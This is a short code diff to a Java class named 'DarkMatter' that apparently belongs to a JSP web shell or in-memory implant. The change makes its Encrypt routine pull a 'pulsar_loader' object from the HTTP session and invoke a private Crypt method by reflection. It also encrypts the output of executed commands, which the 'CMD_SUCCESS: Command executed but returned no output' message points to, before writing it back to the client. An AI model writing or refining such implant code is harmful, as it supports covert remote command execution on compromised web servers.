@@ -30,11 +30,19 @@ public class DarkMatter
     {
         try
         {
-            ClassLoader loader = this.getClass().getClassLoader();
-            java.lang.reflect.Method cryptMethod = loader.getClass().getMethod("crypt", byte[].class, int.class);
-            byte[] abCipher = (byte[])cryptMethod.invoke(loader, abRawResponse, 1);
+            if (objPageContext == null)
+                return abRawResponse;
 
-            return abCipher;
+            javax.servlet.jsp.PageContext pageContext = (javax.servlet.jsp.PageContext)objPageContext;
+            javax.servlet.http.HttpSession session = pageContext.getSession();
+
+            Object pulsarLoader = session.getAttribute("pulsar_loader");
+            if (pulsarLoader == null) return abRawResponse;
+
+            java.lang.reflect.Method cryptMethod = pulsarLoader.getClass().getDeclaredMethod("Crypt", byte[].class, int.class);
+            cryptMethod.setAccessible(true);
+
+            return (byte[])cryptMethod.invoke(pulsarLoader, abRawResponse, 1);
         }
         catch (Exception ex)
         {
@@ -101,7 +109,7 @@ public class DarkMatter
                 if (abResult.length == 0)
                     abResult = "CMD_SUCCESS: Command executed but returned no output".getBytes();
 
-                byte[] abEncryptedResult = Encrypt(null, abResult);
+                byte[] abEncryptedResult = Encrypt(obj, abResult);
                 os.write(abEncryptedResult);
                 os.flush();
 
